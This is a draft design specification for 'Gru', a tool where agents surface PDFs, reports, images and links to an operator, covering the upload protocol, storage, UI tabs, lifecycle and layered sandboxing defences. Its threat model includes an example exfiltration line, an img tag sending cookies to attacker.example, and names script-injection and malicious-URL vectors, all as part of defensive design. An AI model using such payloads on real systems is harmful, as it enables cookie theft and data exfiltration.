# Agent-Surfaced Artifacts — Design Specification

**Date:** 2026-04-24
**Status:** Draft
**Scope:** Lets a Gru-managed agent (minion) surface a piece of work — a rendered PDF, an HTML or Markdown report, or an external link — to the operator in the Gru UI. Extends the per-session main pane (currently just the Terminal tab) with additional artifact tabs and a compact link row.

---

## Goal

Today, when a minion produces something the operator should look at — a resume, a design-review writeup, a rendered spec, a freshly-opened GitHub PR — the only surface is the terminal scrollback. The operator has to scroll, copy URLs, and run their own viewer. Every minion ends up reinventing this with a different markdown blob.

Give agents one well-defined way to say "here's an artifact" and one well-defined way for the UI to render it. Treat external links as a sibling shape (no payload, just a URL) so a session can also point at its own GitHub PR / Slack thread / Figma file with one click.

---

## 1. Artifact Model

### What is an artifact

An artifact is a named piece of agent output addressed by `session_id + artifact_id`. Six kinds:

| Kind   | Payload                | Renders as                                          |
|--------|------------------------|-----------------------------------------------------|
| `pdf`  | bytes (≤ 25 MB)        | tab → `<iframe>` of `application/pdf`               |
| `html` | bytes (≤ 5 MB)         | tab → sandboxed `<iframe>` (see §3)                 |
| `md`   | bytes (≤ 5 MB)         | tab → server-rendered HTML, sandboxed `<iframe>`    |
| `image`| bytes (≤ 25 MB)        | tab → `<img>` (PNG/JPEG/WebP/GIF only)              |
| `file` | bytes (≤ 25 MB)        | tab with download CTA, no preview                   |
| `link` | URL only, no payload   | inline chip in the link row, opens in new tab       |

Caps are server defaults, configurable in `~/.gru/server.yaml`. Per-session caps: 50 artifacts, 100 MB total bytes. Limits exist to keep SQLite small and stop a runaway agent from filling the disk.

### Wire protocol — minion → server

A new authenticated endpoint, mirroring the conventions of `POST /events`:

```
POST /artifacts
X-Gru-Session-ID: <uuid>             ; required
X-Gru-Runtime: <runtime>             ; required, currently "claude-code"
Authorization: Bearer <api-key>      ; same key the gRPC service uses
Content-Type: multipart/form-data    ; for kinds with a payload
```

**Multipart fields** (kinds with bytes):

| Field      | Required | Notes                                                              |
|------------|----------|--------------------------------------------------------------------|
| `kind`     | yes      | one of `pdf` / `html` / `md` / `image` / `file`                    |
| `title`    | yes      | ≤ 80 chars, displayed as the tab label                             |
| `content`  | yes      | the file bytes                                                     |

**JSON body** (kind = link, `Content-Type: application/json`):

```json
{ "kind": "link", "title": "GitHub PR #428", "url": "https://github.com/…", "icon": "github" }
```

`icon` is an optional shorthand the UI maps to a known glyph (`github`, `slack`, `figma`, `linear`, `notion`, `web`). Unknown icons fall back to a generic link glyph.

Server response (both shapes):

```json
{ "id": "<artifact-uuid>", "session_id": "…", "kind": "pdf", "title": "Resume", "url": "/artifacts/<uuid>" }
```

The returned `url` is what the UI fetches for rendering — for `link` kind it is the operator-visible target URL itself; for everything else it is a server-relative path that streams the bytes.

### Storage

- **Bytes on disk**: `~/.gru/artifacts/<session_id>/<artifact_id>.<ext>`, mode `0600`, owned by the gru server user. Filesystem (not SQLite) keeps the DB lean and lets the HTTP layer stream large PDFs cheaply.
- **Metadata in SQLite**: a new `artifacts` table.

```sql
CREATE TABLE IF NOT EXISTS artifacts (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    project_id  TEXT NOT NULL REFERENCES projects(id),
    kind        TEXT NOT NULL,         -- pdf | html | md | image | file | link
    title       TEXT NOT NULL,
    mime_type   TEXT NOT NULL DEFAULT '',
    size_bytes  INTEGER NOT NULL DEFAULT 0,    -- 0 for links
    url         TEXT NOT NULL DEFAULT '',      -- non-empty only for kind=link
    filename    TEXT NOT NULL DEFAULT '',      -- on-disk filename for non-link kinds
    icon        TEXT NOT NULL DEFAULT '',      -- link kind only, '' otherwise
    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ', 'now'))
);

CREATE INDEX IF NOT EXISTS idx_artifacts_session_id ON artifacts(session_id);
```

No migration file — added directly to `001_init.sql` (the project is still in DB-nuke-on-schema-change mode per the v1 design).

### Proto + RPCs

Add to `proto/gru/v1/gru.proto`:

```protobuf
enum ArtifactKind {
  ARTIFACT_KIND_UNSPECIFIED = 0;
  ARTIFACT_KIND_PDF         = 1;
  ARTIFACT_KIND_HTML        = 2;
  ARTIFACT_KIND_MD          = 3;
  ARTIFACT_KIND_IMAGE       = 4;
  ARTIFACT_KIND_FILE        = 5;
  ARTIFACT_KIND_LINK        = 6;
}

message Artifact {
  string id          = 1;
  string session_id  = 2;
  string project_id  = 3;
  ArtifactKind kind  = 4;
  string title       = 5;
  string mime_type   = 6;
  int64  size_bytes  = 7;
  string url         = 8;   // server-relative path or, for kind=link, the target URL
  string icon        = 9;   // link kind only
  google.protobuf.Timestamp created_at = 10;
}

rpc ListArtifacts(ListArtifactsRequest) returns (ListArtifactsResponse);
rpc DeleteArtifact(DeleteArtifactRequest) returns (DeleteArtifactResponse);

message ListArtifactsRequest  { string session_id = 1; }
message ListArtifactsResponse { repeated Artifact artifacts = 1; }
message DeleteArtifactRequest { string id = 1; }
message DeleteArtifactResponse { bool success = 1; }
```

Creation is HTTP-only (multipart), not gRPC — connect-rpc multipart support is awkward and the path mirrors `/events`. Listing and deletion stay on gRPC for consistency with the rest of the dashboard.

A new event type `artifact.created` is published on every successful upload so the UI's existing `SubscribeEvents` stream picks it up without a poll. Payload:

```json
{ "artifact_id": "<uuid>", "kind": "pdf", "title": "Resume" }
```

### Minion-side helper

A new CLI subcommand wraps the multipart POST so agents can upload from a Bash tool call:

```
gru artifact add --kind pdf --title "Resume" --file out.pdf
gru artifact link --title "GitHub PR #428" --icon github --url https://github.com/…
```

Reads the session ID from `<cwd>/.gru/session-id` (same lookup used by `hooks/claude-code.sh`) and the server addr/key from `~/.gru/server.yaml`. No new hook event type, no new env var contract — agents just shell out.

A skill ships in `skills/surfacing-artifacts/` so agents know when to use the helper. Not part of MVP wire-protocol scope, but called out so this design composes with the existing skill model.

---

## 2. UI Integration

### Tab bar above the main pane

`TerminalPanel` currently fills the `<main>` element by itself. Replace its title bar with a per-session **tab bar**:

```
┌─────────────────────────────────────────────────────────────────┐
│ [Terminal] [Resume.pdf] [Design review] [Rendered spec]    [⤢] │  ← tab bar
├─────────────────────────────────────────────────────────────────┤
│ 🔗 GitHub PR #428   💬 Slack thread   🎨 Figma                  │  ← link row (only when present)
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                  Active tab content here                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

- **Terminal** is always the first tab and always present. Default selection on session open. Defending Ctrl-key claims and the focus-ref behavior in `TerminalPanel.tsx` stay unchanged.
- **Artifact tabs** are non-link artifacts, sorted by `created_at` ascending (oldest first → tabs don't shuffle when a new one arrives). The newest gets a brief visual ping (e.g., a 3 s pulse on the tab) to draw the eye without auto-switching focus. We never auto-switch off Terminal — the operator's keystrokes always go where they're looking.
- **Link row** is rendered below the tab bar only when ≥ 1 `link` artifact exists. Each link is a compact chip (icon + title), `target="_blank"`, `rel="noopener noreferrer"`. Right-click → "copy link" via native browser behavior. No extra tab; clicking a chip leaves the Gru tab open and pops a new browser tab.
- A small `…` overflow menu on each artifact tab offers **Open in new tab** (loads the artifact URL directly, useful for PDFs the operator wants to keep open while doing other things) and **Delete** (calls `DeleteArtifact` after a confirm).

Tabs are rendered by a new `SessionTabs.tsx`. The artifact list comes from `ListArtifacts(session_id)` on session open + live updates from `artifact.created` events on the existing `SubscribeEvents` stream. No new socket.

### Per-tab content rendering

| Kind   | Component                | Notes                                                                 |
|--------|--------------------------|-----------------------------------------------------------------------|
| `pdf`  | `<iframe sandbox="" src="/artifacts/<id>">` | Browser PDF viewer. `sandbox=""` blocks JS embedded in the PDF.      |
| `html` | `<iframe sandbox="" src="/artifacts/<id>">` | See §3. Server-side sanitized + CSP `sandbox` response header.       |
| `md`   | same as `html`           | Server renders MD → HTML once at upload time, stores rendered HTML on disk alongside the source `.md`. Re-renders on demand only if storage format changes. |
| `image`| `<img src="/artifacts/<id>">`              | MIME enforced server-side; only PNG/JPEG/WebP/GIF accepted.          |
| `file` | Card with filename, size, **Download** button | `<a href="/artifacts/<id>" download>` — `Content-Disposition: attachment`. |
| `link` | Inline chip in the link row, never a tab.   | See above.                                                            |

Mobile / narrow viewport: tabs scroll horizontally; the link row wraps. Same `coarse-pointer` tap handling that `TerminalPanel` already does for URL detection.

### Empty / loading states

- Session has no artifacts → tab bar shows only "Terminal", no link row (today's behavior).
- Artifact upload in flight (we see `artifact.created` but the bytes haven't been GETted yet) → tab is rendered with a spinner; click selects it and shows a skeleton until the bytes arrive.
- Artifact 404 (operator deleted, race) → tab self-removes and the panel falls back to Terminal.

---

## 3. Security

Artifacts come from a minion. A minion is an LLM-driven process that an attacker (via prompt injection, malicious file content, or compromised tools) can influence. Treat artifact bytes as fully untrusted input.

### Threat model

1. **Script execution in HTML/MD/SVG** — embedded `<script>`, `on*=` handlers, `javascript:` URLs, `<svg>` with `<script>` children, MathML hacks.
2. **Cookie / token theft** — same-origin reads, `document.cookie`, `fetch('/api/...')` with the operator's API-key cookie.
3. **Phishing / clickjacking** — overlaid HTML that mimics the Gru UI to capture credentials or trick approval.
4. **Exfiltration via outbound resource loads** — `<img src="https://attacker.example/?cookies=...">` style beaconing.
5. **PDF embedded JS** — Acrobat-flavored JS in PDFs (modern browser PDF viewers usually disable, but defense in depth).
6. **External links pointing somewhere malicious** — `javascript:`, `data:text/html`, file://, internal-network URLs.

### Defenses — layered

**Layer 1 — server-side validation at upload.**
- Reject mismatched MIME (`pdf` must be `%PDF-` magic; `image` must match its type sniff; `md` must be UTF-8 text).
- For `md`: render to HTML server-side using `gomarkdown` (or equivalent) with raw HTML disabled, then run the result through `bluemonday.UGCPolicy()` extended to allow only safe tags. Store both source and rendered output; the iframe loads the rendered HTML.
- For `html`: run input through `bluemonday.UGCPolicy()` with **no** allowance for `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `on*` attrs, `style` URL functions (`url(javascript:...)`), or `srcset`. Outbound resource hosts are restricted to `data:` and same-origin only — no third-party fetches.
- For `link`: scheme allowlist `https`, `http`, `mailto`. Reject `javascript:`, `data:`, `file:`, RFC1918 / link-local hostnames. Validate URL parses cleanly (`net/url`).

**Layer 2 — HTTP response headers on `/artifacts/<id>`.**
- `Content-Type` set explicitly per kind (no sniff): `application/pdf`, `text/html; charset=utf-8`, `image/png`, etc.
- `X-Content-Type-Options: nosniff`
- `Content-Disposition: attachment` for `kind=file`; `inline` for previewable kinds.
- `Content-Security-Policy: sandbox; default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src 'self' data:; base-uri 'none'; form-action 'none'` for `html` and `md`. The `sandbox` directive forces the browser to treat the response as if it were in a sandboxed iframe even if the user navigates to it directly.
- `Cross-Origin-Resource-Policy: same-site`.
- For `image`: a tighter CSP that disallows everything except the image itself.

**Layer 3 — iframe sandboxing in the UI.**

```html
<iframe sandbox="" src="/artifacts/<id>" referrerpolicy="no-referrer" />
```

Empty `sandbox=""` (no flags) gives:
- Opaque origin: no access to parent's cookies, localStorage, or DOM.
- No script execution.
- No top-level navigation (`<a target=_top>` is inert).
- No form submission.
- No popups, no auto-play, no API access.

Even if Layer 1 sanitization is bypassed and `<script>` reaches the iframe, it cannot run.

**Layer 4 — link rendering.**

```jsx
<a href={url} target="_blank" rel="noopener noreferrer nofollow">{title}</a>
```

`noopener` blocks `window.opener` access; `noreferrer` strips the referrer; `nofollow` discourages crawlers from following minion-attributed links.

### Out of scope for this spec

- Signed URLs / per-artifact tokens. Today the gru server is local-only (tailnet/loopback bind); the existing bearer-token auth on the API surface is sufficient. Revisit if Gru ever serves over the public internet.
- Antivirus / sandboxed file scanning. Operators are presumed to trust their own minions; the threat we defend against is malicious *content*, not malicious *infrastructure*.

---

## 4. Lifecycle

### Creation

- One row in `artifacts`, one file on disk per non-link artifact.
- Server validates kind, MIME, size against caps before writing.
- Atomic create: write to `<artifact_id>.<ext>.tmp`, fsync, rename. DB row inserted only after the rename succeeds.
- Per-session caps enforced inside a transaction: count + sum(size_bytes) checked before insert; over-cap uploads return `409 Conflict` with a structured error.

### Updates

Artifacts are **immutable**. An agent that wants to "update" uploads a new artifact and (optionally) deletes the old one. Two reasons:

1. UI staleness — an open iframe pointing at `/artifacts/<id>` doesn't have to invalidate.
2. Audit — an event log of artifacts the agent surfaced is more useful when each entry is point-in-time.

If a strong "supersedes" relationship is needed later, add an optional `replaces` field to the upload request and a `superseded_by` column. Out of scope for MVP.

### Garbage collection

| Trigger                                | Effect                                                                  |
|---------------------------------------|-------------------------------------------------------------------------|
| `DeleteArtifact(id)`                  | Delete row → unlink file. Errors logged but don't block the row delete. |
| `DeleteSession(session_id)`           | `ON DELETE CASCADE` removes rows; a server-side hook `rm -rf <dir>`.    |
| `PruneSessions()`                     | Same as above for every terminal session it touches.                    |
| Server boot                           | Scan `~/.gru/artifacts/` for orphan directories (no matching session) — log + remove. |
| Per-session cap exceeded on upload    | Reject the upload; do **not** auto-evict. Agents must clean up after themselves. |

The choice to make agents clean up rather than LRU-evict is deliberate: silent eviction would surprise agents that thought they had surfaced something. A clear `409` is easier to handle.

### Caps (defaults)

```yaml
# ~/.gru/server.yaml
artifacts:
  per_artifact_max_bytes:
    pdf: 25_000_000
    html: 5_000_000
    md: 5_000_000
    image: 25_000_000
    file: 25_000_000
  per_session_max_bytes: 100_000_000
  per_session_max_count: 50
```

---

## 5. Minimum Viable Scope

Goal: an agent says "here's a PDF" or "here's a link" and the operator sees it. Defer everything else.

**In MVP:**
1. New `artifacts` table; `001_init.sql` patched in place.
2. `Artifact` proto message + `ListArtifacts`, `DeleteArtifact` RPCs. New event type `artifact.created`.
3. `POST /artifacts` HTTP handler accepting only `kind=pdf` and `kind=link`. Multipart for PDF, JSON for link. Bearer auth, header-based session lookup matching `/events`.
4. `GET /artifacts/<id>` streamer with §3 Layer 2 headers — for MVP the only previewable kind is PDF, which already gets browser-native rendering inside the empty-sandbox iframe.
5. CLI: `gru artifact add --kind pdf --title T --file F` and `gru artifact link --title T --url U [--icon I]`.
6. Web UI: replace `TerminalPanel`'s title bar with `SessionTabs.tsx`; render PDF tabs as `<iframe sandbox="">`; render the link row when ≥ 1 link exists.
7. Lifecycle: cascade-delete on session delete; per-session caps enforced; orphan-directory sweep on boot.

**Deferred (follow-up specs):**
1. `kind=html`, `kind=md`, `kind=image`, `kind=file` — adds the full §3 sanitization stack and additional MIME validation.
2. The `surfacing-artifacts` agent skill — once we know how the PDF + link primitive feels in practice.
3. `replaces` / `superseded_by` semantics.
4. Per-artifact signed URLs (only relevant if Gru ever exposes the artifact endpoint to the public internet).
5. Auto-attaching PR/Slack/Figma links from session metadata (e.g., a `gh pr create` in the session detected by a hook → automatic `link` artifact). Worth doing once the manual primitive works, but not before.

The MVP is small enough to land in a single PR and exercises the full path: agent → CLI → server → DB + disk → publish event → UI tab → iframe render. Everything afterward is incremental.

---

## What's NOT in this spec

- Push notifications when a new artifact is created (covered by the existing attention-queue / notification work).
- Authoring tools for the minion to *generate* PDFs or HTML reports — minions already have shell access and can use `pandoc`, `weasyprint`, etc. Out of scope.
- Cross-session artifact sharing or pinning at the project level.
- Versioning or diffing of artifacts across uploads.
- Per-operator visibility / ACLs on artifacts — Gru is single-operator today.
